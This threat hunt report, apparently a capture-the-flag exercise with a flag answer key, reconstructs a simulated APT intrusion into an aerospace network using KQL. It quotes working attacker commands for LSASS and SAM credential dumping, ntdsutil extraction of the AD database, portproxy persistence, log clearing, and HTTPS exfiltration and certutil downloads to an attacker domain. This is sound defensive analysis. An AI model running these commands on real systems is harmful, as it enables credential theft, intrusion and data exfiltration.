# Operation Silent Corridor // Threat Hunt Report

**Hunt ID:** Hunt 04  
**Classification:** CONFIDENTIAL  
**Methodology:** PEAK (Prepare, Execute, Act, Knowledge)  
**Platform:** Microsoft Sentinel (KQL)  
**Analyst:** Chukwuebuka Okorie  
**Date:** May 2026  
**Organisation:** Haldric Aerospace // Engineering Segment  
**Threat Actor:** GREY VEIL (State-Sponsored APT)  
**Table:** `SilentCorridorX_CL`  
**Events:** 8,538  
**Investigation Window:** 20 February - 5 March 2026  

---

<img width="1828" height="636" alt="image" src="https://github.com/user-attachments/assets/372004af-048c-4598-a65a-440da799b42f" />

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [PEAK Phase 1 - Prepare](#2-peak-phase-1---prepare)
3. [PEAK Phase 2 - Execute](#3-peak-phase-2---execute)
4. [PEAK Phase 3 - Act](#4-peak-phase-3---act)
5. [PEAK Phase 4 - Knowledge](#5-peak-phase-4---knowledge)
6. [Attack Timeline](#6-attack-timeline)
7. [Flag Register](#7-flag-register)
8. [MITRE ATT&CK Mapping](#8-mitre-attck-mapping)
9. [Cyber Kill Chain Mapping](#9-cyber-kill-chain-mapping)
10. [Indicators of Compromise](#10-indicators-of-compromise)
11. [Affected Assets](#11-affected-assets)
12. [Detection Gap Analysis](#12-detection-gap-analysis)
13. [Recommendations](#13-recommendations)
14. [Appendix - KQL Queries and Evidence](#14-appendix---kql-queries-and-evidence)

---

## 1. Executive Summary

Between 20 February and 5 March 2026, a threat actor known as GREY VEIL broke into Haldric Aerospace's engineering network. This was not discovered by any automated alert. Instead, it was found through a proactive threat hunt that was kicked off after Germany's federal intelligence agency (BfV) warned defence companies that GREY VEIL had been targeting organisations like ours.

Here is what happened in short: the attacker stole VPN login details for an engineer called s.brandt. They used those details to log into the network from anonymous IP addresses (the kind used to hide your real location). Once inside, they landed on a workstation called WS-ENG04 and started looking around. They tried to dump passwords from memory but that failed. So they found another way, stealing credentials for a second account called m.richter. With those credentials, they moved across to the domain controller (SRV-DC01) and the file server (SRV-FILES02). On the file server, they found what they were looking for: classified navigation system data for the A400M military transport aircraft. They compressed it, encoded it, and sent it out over HTTPS to a server they controlled. Then they cleaned up after themselves by deleting files and clearing logs.

The only reason we can see any of this is because Sysmon was running. The attacker cleared the Windows Security logs on every machine they touched, but Sysmon kept recording independently and they either did not know about it or did not bother to clear it.

---

## 2. PEAK Phase 1 - Prepare

### 2.1 Why This Hunt Happened

The BfV (Germany's domestic intelligence agency) sent a confidential warning to defence companies. The warning said that a group called GREY VEIL had been breaking into European aerospace and defence companies since late 2025. Their goal is stealing intellectual property (things like engineering designs and technical data) and keeping long-term access to engineering networks. Past victims said the attackers were inside for weeks before anyone noticed.

K. Hofmann, Haldric Aerospace's CISO, read that advisory and decided not to wait for an alert. Instead, they asked for a proactive threat hunt across the engineering network. The thinking was: if GREY VEIL is inside, we need to find them before they finish what they came to do.

### 2.2 What We Were Looking For

The main hypothesis was simple: GREY VEIL may have already compromised the engineering segment through the VPN. We needed to check whether anyone had logged in from somewhere they should not have, whether there were commands running on machines that did not look right, and whether any data had been moved or taken.

### 2.3 What We Had to Work With

Everything was in one big table called `SilentCorridorX_CL` inside Microsoft Sentinel. This table contained VPN logs, process creation events, file events, network connections, registry changes, and logon events, all merged together. Two columns were essential for navigating it:

- **MdeTable** tells you what type of data you are looking at (for example, "FortiGateVPN" for VPN logs, "DeviceProcessEvents" for commands that ran on machines)
- **DeviceName** tells you which machine the event came from

One important gotcha: the EventTime column is a string, not a proper datetime. Sorting works fine, but if you need to do any time calculations (like "how many days between these two events"), you have to wrap it in `todatetime()`.

Every query in this investigation started with this base filter to exclude test data:

```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
```

### 2.4 What We Know About GREY VEIL

From the BfV advisory and past reporting:

- They work for a foreign intelligence service
- They go after remote access systems (like VPNs) to get in
- They use tools that are already on the machine (built-in Windows commands) so they blend in with normal activity
- They stay inside networks for weeks at a time
- They are after engineering data related to defence programmes
- In past intrusions, no antivirus alerts fired and no malware was found

---

## 3. PEAK Phase 2 - Execute

This is where the actual hunting happened. I have broken it down into six stages that follow the order in which the attacker operated.

### Stage 1: Finding the Suspicious Account

Since GREY VEIL is known to come in through VPNs, the first thing I did was profile every VPN account to see if anything looked off.

```kql
HuntData
| where MdeTable == "FortiGateVPN"
| summarize 
    Sessions = count(),
    UniqueSourceIPs = dcount(RemoteIP),
    UniqueDestinations = dcount(DestinationHost),
    UniqueTunnelIPs = dcount(TunnelIP),
    FirstSeen = min(EventTime),
    LastSeen = max(EventTime),
    SourceIPs = make_set(RemoteIP)
    by AccountName
| sort by Sessions desc
```

Three accounts came back. Two of them (m.richter and k.weber) looked completely normal: they each connected from one IP address, which is what you would expect from someone working from home. But the third account, **s.brandt**, stood out immediately. It had 89 sessions (way more than the others), connected from 4 different source IPs, and was assigned 3 different tunnel IPs.

When I looked at those 4 source IPs more closely:

- **88.153.72.14** - This was the real s.brandt. Connected during normal working hours, same IP every time.
- **185.220.101.34** - First appeared with a *failed* login at 23:47 on Feb 19, then a *successful* login at 02:14 on Feb 20. Late night, failed then succeeded. That is textbook credential stuffing.
- **91.234.33.126** - First seen Feb 25 at 03:15. Another late-night connection.
- **45.153.160.88** - First seen Mar 2 at 01:10. Same pattern.

The last three IPs looked like anonymisation infrastructure (VPN services, proxies, or Tor exit nodes). Regular employees do not connect from multiple anonymous IPs at 2am.

<img width="1251" height="677" alt="image" src="https://github.com/user-attachments/assets/966722ce-44ce-47bf-bcf9-307e10c00cea" />

I also noticed something important about the tunnel IPs. When the real s.brandt connected (from 88.153.72.14), the VPN assigned them tunnel IP **10.20.10.101**. When the attacker connected (from the anonymous IPs), they got tunnel IP **10.1.96.114**. This difference became really useful later when tracking where the attacker went inside the network.

---

### Stage 2: What the Attacker Did First (Beachhead Recon)

Every VPN session, both legitimate and attacker, terminated on the same machine: **WS-ENG04**. This means WS-ENG04 is the "beachhead" - the first machine the attacker landed on.

To see what the attacker did on this machine, I pulled all process execution events for s.brandt on WS-ENG04 and filtered out the normal Windows background stuff:

```kql
HuntData
| where MdeTable == "DeviceProcessEvents"
| where DeviceName has "WS-ENG04"
| where AccountName == "s.brandt"
| where FileName !in~ ("TSTheme.exe", "taskhostw.exe", "conhost.exe", 
    "AtBroker.exe", "cmd.exe", "rdpclip.exe", "smartscreen.exe", 
    "backgroundTaskHost.exe")
| project EventTime, FileName, ProcessCommandLine, InitiatingProcessFileName
| sort by EventTime asc
```

The very first suspicious command was `systeminfo`, and it ran at exactly the same time as the attacker's first successful VPN login (Feb 20 02:14). The `systeminfo` command shows you everything about a machine: OS version, hardware, domain membership, network config. It is the first thing an attacker runs to understand where they have landed. It was spawned by `cmd.exe`, meaning the attacker opened a command prompt and typed it in.

<img width="1251" height="677" alt="image" src="https://github.com/user-attachments/assets/b04b5773-5cf8-494e-9357-8514027f6505" />

Three days later (Feb 23 at 01:47), the attacker came back and started enumerating Active Directory. They wanted to know who the admins were:

```
net group "Domain Admins" /dom       (01:47:00)
net group "Enterprise Admins" /dom   (01:47:48)
```

These commands ask the domain controller "who is in the Domain Admins group?" and "who is in the Enterprise Admins group?" This tells the attacker which accounts are worth stealing.

They also looked at what drives were available on the machine:

```
wmic logicaldisk get caption,filesystem,freespace,size,volumename
```

After that, I checked the DNS logs to see what else the attacker was looking up from WS-ENG04:

```kql
HuntData
| where isnotempty(DnsQueryString)
| where DeviceName has "WS-ENG04"
| project EventTime, DnsQueryString, DnsQueryResult
| sort by EventTime asc
```

Two internal servers showed up: **SRV-DC01** (the domain controller, at 10.1.31.206) and **SRV-FILES02** (a file server, at 10.1.70.42). The attacker was mapping out the network to figure out where the valuable stuff was.

<img width="918" height="923" alt="image" src="https://github.com/user-attachments/assets/535c72ae-ee82-4ca0-ac2e-197342ad281f" />

---

### Stage 3: Stealing Credentials

The attacker now knew who the admins were and what servers existed. But they were logged in as s.brandt, a regular engineer. To reach those servers, they needed admin credentials. So they went credential hunting.

**Attempt 1 - LSASS memory dump (Feb 26 02:38)**

LSASS (Local Security Authority Subsystem Service) is the Windows process that handles authentication. It holds password hashes and tokens in memory. If you can dump its memory, you can extract those credentials. The attacker did this in two steps:

```
tasklist /fi "imagename eq lsass.exe"    (find the process ID of lsass)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 628 
  C:\Windows\Temp\sys_diag.dmp full      (dump its memory to a file)
```

But when I searched for the output file (`sys_diag.dmp`), it was nowhere to be found:

```kql
HuntData
| where DeviceName has "WS-ENG04"
| where FileName has "sys_diag" or FolderPath has "sys_diag"
| project EventTime, MdeTable, FileName, FolderPath, ActionType
```

No results. The dump failed silently. This is likely because Credential Guard or LSA Protection was enabled on the machine, which prevents processes from reading LSASS memory. Good security control, and it actually stopped the attacker here.

**Attempt 2 - Other credential sources (Feb 26-27)**

The attacker did not give up. They tried several alternative approaches:

| When | What they ran | What it does |
|------|--------------|--------------|
| Feb 26 02:42 | `reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"` | Checks if anyone saved SSH passwords in PuTTY (a common SSH client) |
| Feb 27 11:04 | `cmdkey /list` | Lists all credentials saved in Windows Credential Manager |
| Feb 27 12:20 | `reg save HKLM\SAM C:\Windows\Temp\sam.bak` | Exports the SAM database, which contains local account password hashes |

Through one of these methods, the attacker got hold of credentials for **m.richter** (username: m.richter, password: Haldric2025SecIT). We know this because those exact credentials appear in the commands they ran next.

---

### Stage 4: Moving to Other Machines (Lateral Movement)

On Feb 28 at 03:15, the attacker used m.richter's stolen credentials to connect to the domain controller:

```
net use \\SRV-DC01\C$ /user:m.richter Haldric2025SecIT
```

The `net use` command maps a network drive. The `C$` is a hidden administrative share that gives access to the entire C: drive. The attacker essentially mounted SRV-DC01's hard drive over the network.

They then used WMIC (Windows Management Instrumentation Command-line) to run commands remotely on SRV-DC01:

```
wmic /node:"SRV-DC01" /user:"m.richter" /password:"Haldric2025SecIT" 
  process call create "cmd.exe /c mkdir C:\Windows\Temp\McAfee_Logs 
  & ntdsutil \"ac i ntds\" ifm \"create full C:\Windows\Temp\McAfee_Logs\""
```

This is a big one. Let me break it down:

- `wmic /node:"SRV-DC01"` - run this command on SRV-DC01 remotely
- `mkdir C:\Windows\Temp\McAfee_Logs` - create a folder disguised as McAfee antivirus logs (clever naming to avoid suspicion)
- `ntdsutil "ac i ntds" ifm "create full C:\Windows\Temp\McAfee_Logs\"` - this is the dangerous part. **ntdsutil** is a legitimate Microsoft tool for managing Active Directory. The IFM (Install From Media) feature creates an offline copy of the AD database. The AD database file is called **ntds.dit** and it contains password hashes for every single account in the domain.

Normally ntds.dit is locked by the system while Active Directory is running, so you cannot just copy it. The IFM method is one of the known ways to get around that lock and extract a usable copy.

I confirmed the files were actually created by checking file events on SRV-DC01:

```kql
HuntData
| where MdeTable == "DeviceFileEvents"
| where DeviceName has "SRV-DC01"
| where FolderPath has "McAfee_Logs"
| project EventTime, FileName, FolderPath, ActionType, InitiatingProcessFileName
| sort by EventTime asc
```

The results showed ntds.dit, SYSTEM, and SECURITY files all being created inside the McAfee_Logs directory. Interestingly, **MsMpEng.exe** (which is Microsoft Defender) also accessed those files immediately after they were created. Defender scanned them but did not block anything. That is a significant gap - Defender saw the ntds.dit being extracted and did nothing about it.

**Setting up persistence**

The attacker also set up port forwarding rules so they could get back in even if passwords were changed:

On WS-ENG04:
```
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 
  listenport=8443 connectport=445 connectaddress=SRV-DC01.haldric.local
```

On SRV-DC01:
```
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 
  listenport=9999 connectaddress=10.1.36.210 connectport=8443 protocol=tcp
```

<img width="1240" height="514" alt="image" src="https://github.com/user-attachments/assets/7506a4ff-9f13-4f3b-b4d3-aa5b66e4a387" />

What this does is create a chain of network tunnels. Traffic coming into WS-ENG04 on port 8443 gets forwarded to SRV-DC01 on port 445 (SMB). Traffic coming into SRV-DC01 on port 9999 gets forwarded to another address. These rules are saved in the Windows registry and survive reboots. Even if you change every password in the domain, these tunnels still work. That is what makes them dangerous as a persistence mechanism.

The registry key where this is stored is: `HKLM\System\CurrentControlSet\Services\PortProxy\v4tov4\tcp`

The attacker then also connected to the file server:
```
net use \\SRV-FILES02\C$ /user:m.richter Haldric2025SecIT
```

I verified the attacker's tunnel IP (10.1.96.114) reached all three machines by checking logon events:

```kql
HuntData
| where MdeTable == "DeviceLogonEvents"
| where RemoteIP == "10.1.96.114"
| summarize count() by DeviceName
```

Results: WS-ENG04 (14 events), SRV-DC01 (2 events), SRV-FILES02 (2 events). The attacker touched every machine in scope.

---

### Stage 5: Stealing the Data

This is the part where the attacker took what they came for.

On SRV-FILES02, they ran:

```
powershell Compress-Archive -Path 'C:\Engineering\Avionics\A400M_NavSys\*' 
  -DestinationPath 'C:\Windows\Temp\win_update_kb5034.zip' -Force
```

<img width="1173" height="779" alt="image" src="https://github.com/user-attachments/assets/ef5646ef-84f7-4972-a876-156741ac310e" />

The A400M is a military transport aircraft used by several European air forces. The NavSys directory contains navigation system engineering data. This is exactly the kind of intellectual property that GREY VEIL goes after according to the BfV advisory. They compressed the entire directory into a zip file and named it to look like a Windows update (`win_update_kb5034.zip`) to avoid suspicion.

Next, they encoded the zip file into base64 format. Base64 turns binary data into text characters, which makes it easier to send over HTTP without triggering content inspection tools:

```
certutil -encode C:\Windows\Temp\win_update_kb5034.zip 
  C:\Windows\Temp\win_update_kb5034.b64
```

`certutil` is another built-in Windows tool. It is meant for managing certificates, but attackers commonly use its `-encode` feature for this purpose.

Finally, the encoded file was sent out from WS-ENG04 (not from SRV-FILES02 where it was created) on Mar 2 at 01:19:

```
powershell Invoke-WebRequest -Uri "https://cdn-telemetry.cloud-endpoint.net" 
  -Method POST -InFile "C:\Windows\Temp\win_update_kb5034.b64" -UseBasicParsing
```

The domain `cdn-telemetry.cloud-endpoint.net` is attacker-controlled. It is designed to look like a legitimate content delivery network telemetry endpoint so that someone glancing at network logs would not think twice about it. The DNS resolved it to 172.67.174.46 and 104.21.30.237.

---

### Stage 6: Cleaning Up and Coming Back

After exfiltrating the data, the attacker tried to cover their tracks.

**Log clearing:**

They cleared the Windows Security event log on all three machines. On WS-ENG04 they did it directly:

```
wevtutil cl Security
```

On SRV-DC01 and SRV-FILES02, they did it remotely through WMIC:

```
wmic /node:"SRV-DC01" /user:"m.richter" /password:"Haldric2025SecIT" 
  process call create "cmd.exe /c wevtutil cl Security"
```

The way I could tell the difference between direct and remote clearing was by looking at the parent process. On WS-ENG04, the parent was cmd.exe (the attacker typed it directly). On SRV-DC01 and SRV-FILES02, the parent was WmiPrvSE.exe (meaning it was triggered remotely by a WMIC call).

**File cleanup:**

On SRV-DC01, they deleted the staging folder:
```
cmd.exe /c rmdir /s /q C:\Windows\Temp\McAfee_Logs
```

On SRV-FILES02, they deleted the staged files:
```
cmd.exe /c del /f /q C:\Windows\Temp\nav_cache.cab 
  C:\Windows\Temp\win_update_kb5034.zip C:\Windows\Temp\win_update_kb5034.b64
```

**Re-entry:**

Two days after exfiltration (Mar 4 at 02:45), the attacker came back to check their command-and-control channel:

```
certutil -urlcache -split -f "https://cdn-telemetry.cloud-endpoint.net" 
  C:\Windows\Temp\response.txt
```

This is basically the attacker phoning home to see if there are new instructions. The `-urlcache` flag tells certutil to download a file from a URL. The fact that they came back means this was not a one-off operation. They intended to maintain access.

---

## 4. PEAK Phase 3 - Act

### What Needs to Happen Right Now (24-48 hours)

1. **Isolate WS-ENG04** from the network. It is the attacker's way in and the machine they use to reach everything else.
2. **Remove the portproxy rules** on WS-ENG04 and SRV-DC01. Run `netsh interface portproxy reset` on both machines. These survive password resets, so just changing passwords will not remove this backdoor.
3. **Reset every password in the domain.** The ntds.dit file was stolen, which means the attacker has the password hash for every single account. This includes service accounts, admin accounts, and the KRBTGT account (which needs to be reset twice).
4. **Block the attacker's IPs and domain** at the firewall: 185.220.101.34, 91.234.33.126, 45.153.160.88, and cdn-telemetry.cloud-endpoint.net (172.67.174.46, 104.21.30.237).
5. **Revoke all VPN sessions** for s.brandt and review access for all other VPN users.

### What Should Happen Next (1-2 weeks)

6. Turn on MFA (multi-factor authentication) for all VPN connections. The attacker got in with just a username and password. MFA would have stopped them.
7. Rebuild WS-ENG04 from scratch. You cannot trust a machine that an attacker had weeks of access to.
8. Check every machine in the engineering segment for portproxy rules or other persistence.
9. Set up Defender to actually block credential dumping (the LSASS dump technique and ntdsutil).
10. Make sure logs are being forwarded to Sentinel in real time so that clearing local logs does not destroy the evidence.

### Longer-Term Improvements (1-3 months)

11. Put network segmentation in place. Engineering workstations should not be able to directly reach the domain controller or file server over SMB.
12. Set up a PAM (Privileged Access Management) solution so admin credentials are not stored in places like PuTTY or Windows Credential Manager.
13. Add geo-restrictions to the VPN. If all engineers are in Germany, block VPN logins from outside the country.
14. Start doing regular threat hunts based on GREY VEIL's known techniques.

---

## 5. PEAK Phase 4 - Knowledge

### What I Learned From This Hunt

**Sysmon saved the investigation.** The attacker cleared the Windows Security logs on every machine they touched. If we had been relying only on Windows event logs, there would be zero evidence of this intrusion. But Sysmon was running independently and the attacker either did not know about it or did not prioritise clearing it. Every finding in this report came from Sysmon telemetry. This is a strong argument for always having Sysmon deployed and forwarding to a central SIEM.

**Living off the land is hard to detect.** Every single tool the attacker used was a built-in Windows binary: systeminfo, net, wmic, netsh, certutil, powershell, wevtutil, reg, tasklist, rundll32, ntdsutil. None of these would trigger an antivirus alert because they are legitimate Microsoft tools. The only way to catch this kind of activity is by looking at what those tools are doing (their command-line arguments) rather than just whether they are running.

**Defender saw the threat but did not stop it.** MsMpEng.exe (Defender's engine) scanned the ntds.dit file on SRV-DC01 right after it was created. It interacted with the file but did not quarantine it or raise an alert. This is a policy configuration issue that needs to be fixed.

**Credential Guard works, but it is not enough.** The LSASS memory dump failed silently, which means some form of credential protection was in place. But the attacker just moved on to other credential sources (PuTTY sessions, Credential Manager, SAM hive). Defence in depth matters.

**Port forwarding is an underrated persistence method.** Most incident response playbooks focus on "reset passwords and reimage the machine." But the netsh portproxy rules the attacker set up would survive all of that. They are stored in the registry and do not depend on any user account. This is something I will be looking for in future hunts.

### Detection Ideas for the Future

Based on what I saw in this hunt, here are some detection rules that would catch this kind of activity:

| What to detect | How | Why it matters |
|----------------|-----|----------------|
| VPN from multiple IPs | Alert when one account connects from more than 2 unique IPs in a week | Catches credential sharing or theft |
| Commands targeting lsass | `ProcessCommandLine has "lsass"` | Catches credential dump attempts |
| SAM hive export | `ProcessCommandLine has "HKLM\\SAM"` | Catches local credential theft |
| ntdsutil usage | `ProcessCommandLine has "ntdsutil"` | Catches AD database extraction |
| Portproxy creation | `ProcessCommandLine has "portproxy"` | Catches network persistence |
| Security log clearing | `ProcessCommandLine has "wevtutil" and "cl"` | Catches anti-forensic activity |
| Remote WMIC | `ProcessCommandLine has "wmic" and "/node:"` | Catches remote command execution |
| Certutil misuse | `ProcessCommandLine has "certutil" and ("-encode" or "-urlcache")` | Catches encoding and downloads |

---

## 6. Attack Timeline

This is the full sequence of events in the order they happened:

| Date | Time (UTC) | What Happened | Where | MITRE ID |
|------|-----------|---------------|-------|----------|
| Feb 19 | 23:47 | Failed VPN login from attacker IP | VPN Gateway | T1078 |
| Feb 20 | 02:14 | Successful VPN login + `systeminfo` | WS-ENG04 | T1078, T1082 |
| Feb 23 | 01:47 | Domain Admins / Enterprise Admins enumeration | WS-ENG04 | T1069.002 |
| Feb 23 | 01:49 | Disk enumeration (wmic logicaldisk) | WS-ENG04 | T1082 |
| Feb 23 | 11:01 | Security log cleared (first time) | WS-ENG04 | T1070.001 |
| Feb 25 | 03:15 | VPN login from second attacker IP | VPN Gateway | T1078 |
| Feb 26 | 02:38 | LSASS dump attempted (failed) | WS-ENG04 | T1003.001 |
| Feb 26 | 02:42 | PuTTY credential harvest | WS-ENG04 | T1552.001 |
| Feb 27 | 11:04 | Credential Manager enumeration | WS-ENG04 | T1555 |
| Feb 27 | 12:20 | SAM hive exported | WS-ENG04 | T1003.002 |
| Feb 28 | 03:15 | Lateral movement to SRV-DC01 (net use + WMIC) | WS-ENG04 -> SRV-DC01 | T1021.002, T1047 |
| Feb 28 | 03:16 | ntds.dit extracted via ntdsutil IFM | SRV-DC01 | T1003.003 |
| Feb 28 | 03:18 | A400M NavSys data compressed | SRV-FILES02 | T1560.001 |
| Feb 28 | 03:19 | Zip file base64-encoded with certutil | SRV-FILES02 | T1140 |
| Feb 28 | 03:25 | Portproxy persistence set on WS-ENG04 | WS-ENG04 | T1090.001 |
| Feb 28 | 03:29 | Lateral movement to SRV-FILES02 | WS-ENG04 -> SRV-FILES02 | T1021.002 |
| Feb 28 | 03:39-48 | Cleanup: file deletion + log clearing on remote hosts | SRV-DC01, SRV-FILES02 | T1070.001, T1070.004 |
| Mar 02 | 01:10 | VPN login from third attacker IP | VPN Gateway | T1078 |
| Mar 02 | 01:19 | Data exfiltrated via HTTPS POST | WS-ENG04 | T1048.002 |
| Mar 04 | 02:45 | Attacker came back, checked C2 channel | WS-ENG04 | T1105 |

---

## 7. Flag Register

This is a record of every flag from the hunt, the answer, and how many points each was worth.

| Flag | Question | Answer |
|------|----------|--------|
| Q00 | Environment Access | `SilentCorridorX_CL` |
| Q01 | Suspicious Account | `s.brandt` |
| Q02 | Origin of Failed Auth | `185.220.101.34` |
| Q03 | Connection Footprint | `4` |
| Q04 | Source Address Inventory | `45.153.160.88, 88.153.72.14, 91.234.33.126, 185.220.101.34` |
| Q05 | Internal Landing Point | `WS-ENG04` |
| Q06 | Initial Process | `systeminfo.exe/cmd.exe` |
| Q07 | Directory Enumeration | `Domain Admins, Enterprise Admins` |
| Q08 | Network Reconnaissance | `SRV-DC01, SRV-FILES02` |
| Q09 | First Credential Activity | `tasklist /fi "imagename eq lsass.exe"` |
| Q10 | Credential Dump Outcome | `NO/none` |
| Q11 | Stored Credential Source | `SAM` |
| Q12 | Saved Credentials | `cmdkey  /list` |
| Q13 | First Lateral Pivot | `10.1.96.114/SRV-DC01/m.richter` |
| Q14 | New Account Observed | `m.richter` |
| Q15 | Cross-Host Spawning | `WMIC` |
| Q16 | New Filesystem Activity | `C:\Windows\Temp\McAfee_Logs` |
| Q17 | Critical File | `ntds.dit/m.richter` |
| Q18 | Concurrent File Access | `MsMpEng.exe` |
| Q19 | Database File Access | `ntdsutil` |
| Q20 | Spawning Source | `WmiPrvSE.exe/WS-ENG04` |
| Q21 | RDP Scope | `SRV-DC01, SRV-FILES02, WS-ENG04` |
| Q22 | Network Configuration Change | `netsh  interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8443 connectport=445 connectaddress=SRV-DC01.haldric.local` |
| Q23 | Configuration Storage | `HKLM\System\CurrentControlSet\Services\PortProxy\v4tov4\tcp` |
| Q24 | Matching Configuration on DC | `netsh  interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress=10.1.36.210 connectport=8443 protocol=tcp` |
| Q25 | Targeted Directory | `C:\Engineering\Avionics\A400M_NavSys` |
| Q26 | Packaged Output | `win_update_kb5034.zip` |
| Q27 | Compression Method | `Compress-Archive` |
| Q28 | Format Conversion | `certutil` |
| Q29 | Outbound Transfer | `powershell  Invoke-WebRequest -Uri "https://cdn-telemetry.cloud-endpoint.net" -Method POST -InFile "C:\Windows\Temp\win_update_kb5034.b64" -UseBasicParsing` |
| Q30 | External Destination | `cdn-telemetry.cloud-endpoint.net` |
| Q31 | Reentry Window | `2` |
| Q32 | First Cleanup Action | `wevtutil  cl Security` |
| Q33 | Clearing Method Analysis | `WS-ENG04/SRV-DC01, SRV-FILES02` |
| Q34 | Surviving Log Source | `Sysmon` |
| Q35 | Exfiltration Confidence Call | `HIGH` (with supporting evidence) |
| Q36 | DC Staging Cleanup | `cmd.exe /c rmdir /s /q C:\Windows\Temp\McAfee_Logs` |
| Q37 | CISO Brief | Prose summary |

---

## 8. MITRE ATT&CK Mapping

MITRE ATT&CK is a framework that categorises attacker behaviour into tactics (the "why") and techniques (the "how"). Here is how GREY VEIL's activity maps to it.

### Initial Access (How they got in)
| ID | Technique | What we saw |
|----|-----------|-------------|
| T1078 | Valid Accounts | Used stolen s.brandt VPN credentials from anonymous IPs |

### Execution (How they ran commands)
| ID | Technique | What we saw |
|----|-----------|-------------|
| T1059.001 | PowerShell | Used for Compress-Archive and Invoke-WebRequest |
| T1059.003 | Windows Command Shell | cmd.exe was the primary tool throughout |
| T1047 | WMI | WMIC used to remotely run commands on SRV-DC01 and SRV-FILES02 |

### Persistence (How they planned to stay)
| ID | Technique | What we saw |
|----|-----------|-------------|
| T1090.001 | Internal Proxy | Netsh portproxy rules on WS-ENG04 and SRV-DC01 |

### Credential Access (How they stole passwords)
| ID | Technique | What we saw |
|----|-----------|-------------|
| T1003.001 | LSASS Memory | Attempted comsvcs.dll MiniDump (failed) |
| T1003.002 | SAM Registry | Exported SAM hive with reg save |
| T1003.003 | NTDS | Used ntdsutil IFM to copy AD database |
| T1552.001 | Credentials in Files | Checked PuTTY saved sessions |
| T1555 | Credentials from Password Stores | Used cmdkey /list for Credential Manager |

### Discovery (How they mapped the environment)
| ID | Technique | What we saw |
|----|-----------|-------------|
| T1082 | System Information | systeminfo, wmic logicaldisk |
| T1069.002 | Domain Groups | net group Domain Admins / Enterprise Admins |
| T1018 | Remote System Discovery | DNS lookups for SRV-DC01 and SRV-FILES02 |
| T1049 | System Network Connections | netstat -ano, arp -a |
| T1016 | System Network Config | ipconfig /all, netsh interface show interface |

### Lateral Movement (How they moved between machines)
| ID | Technique | What we saw |
|----|-----------|-------------|
| T1021.002 | SMB/Admin Shares | net use to map C$ shares on SRV-DC01 and SRV-FILES02 |

### Collection (How they gathered the data)
| ID | Technique | What we saw |
|----|-----------|-------------|
| T1560.001 | Archive via Utility | PowerShell Compress-Archive on the NavSys directory |

### Command and Control (How they communicated)
| ID | Technique | What we saw |
|----|-----------|-------------|
| T1105 | Ingress Tool Transfer | certutil -urlcache to download from C2 |
| T1132.001 | Standard Encoding | certutil -encode to convert data to base64 |

### Exfiltration (How they got the data out)
| ID | Technique | What we saw |
|----|-----------|-------------|
| T1048.002 | Exfil Over HTTPS | PowerShell Invoke-WebRequest POST to cdn-telemetry.cloud-endpoint.net |

### Defence Evasion (How they hid their tracks)
| ID | Technique | What we saw |
|----|-----------|-------------|
| T1070.001 | Clear Event Logs | wevtutil cl Security on all three hosts |
| T1070.004 | File Deletion | rmdir and del to remove staging artifacts |
| T1036 | Masquerading | Named staging dir "McAfee_Logs" and exfil file "win_update_kb5034" |
| T1140 | Deobfuscate/Decode | certutil -encode for base64 conversion |

---

## 9. Cyber Kill Chain Mapping

The Cyber Kill Chain is a simpler model that describes the stages of an attack from start to finish. Here is how this intrusion fits.

### 1. Reconnaissance
We did not see this stage directly in the data. The attacker likely researched Haldric Aerospace externally to identify VPN infrastructure and employee names before the investigation window started.

### 2. Weaponisation
Not applicable here. GREY VEIL does not use custom malware or exploits. Everything they do is with tools already on the target machines.

### 3. Delivery
The attacker "delivered themselves" into the network by logging into the FortiGate VPN with stolen s.brandt credentials from anonymous IP 185.220.101.34. The failed login on Feb 19 followed by a successful one on Feb 20 shows they were brute-forcing or testing the credentials.

### 4. Exploitation
After landing on WS-ENG04, the attacker tried to dump LSASS memory (failed), then harvested credentials from PuTTY, Credential Manager, and the SAM hive. This gave them m.richter's credentials, which had admin access to the servers.

### 5. Installation
The attacker installed persistence through netsh portproxy rules on WS-ENG04 (port 8443 forwarding to SRV-DC01 on port 445) and SRV-DC01 (port 9999 forwarding to 10.1.36.210 on port 8443). These are stored in the registry and survive reboots and password changes.

### 6. Command and Control
The attacker used cdn-telemetry.cloud-endpoint.net as their C2 server. They both sent stolen data to it (via Invoke-WebRequest POST) and checked it for instructions (via certutil -urlcache). The domain name is designed to look like a legitimate CDN service.

### 7. Actions on Objectives
The attacker achieved their goal: stealing classified engineering data. They compressed the A400M_NavSys avionics directory, encoded it in base64, and sent it to their server over HTTPS. They also extracted the ntds.dit file from the domain controller, giving them every password hash in the domain for future use.

---

## 10. Indicators of Compromise

These are the specific artefacts (IPs, domains, file paths, accounts) that can be used to detect this attacker or check whether other systems have been affected.

### Network Indicators

| Indicator | Type | What it is |
|-----------|------|------------|
| 185.220.101.34 | IPv4 | Attacker's first VPN source IP (the one with the failed login) |
| 91.234.33.126 | IPv4 | Attacker's second VPN source IP |
| 45.153.160.88 | IPv4 | Attacker's third VPN source IP |
| cdn-telemetry.cloud-endpoint.net | Domain | C2 server and exfiltration destination |
| 172.67.174.46 | IPv4 | IP address the C2 domain resolved to |
| 104.21.30.237 | IPv4 | Second IP address the C2 domain resolved to |
| 10.1.96.114 | Internal IP | VPN tunnel IP assigned to attacker sessions |

### File and Path Indicators

| Indicator | Where | What it is |
|-----------|-------|------------|
| C:\Windows\Temp\sys_diag.dmp | WS-ENG04 | Target for LSASS dump (was not created) |
| C:\Windows\Temp\sam.bak | WS-ENG04 | Exported SAM hive |
| C:\Windows\Temp\McAfee_Logs | SRV-DC01 | Fake directory used to stage ntds.dit (deleted) |
| C:\Windows\Temp\win_update_kb5034.zip | SRV-FILES02 | Compressed stolen data (deleted) |
| C:\Windows\Temp\win_update_kb5034.b64 | WS-ENG04 | Base64-encoded stolen data |
| C:\Windows\Temp\response.txt | WS-ENG04 | C2 response file |
| C:\Windows\Temp\nav_cache.cab | SRV-FILES02 | Staging artefact (deleted) |

### Compromised Accounts

| Account | How it was compromised | What it was used for |
|---------|----------------------|---------------------|
| s.brandt | VPN credentials stolen (method unknown) | Initial access to the network via VPN |
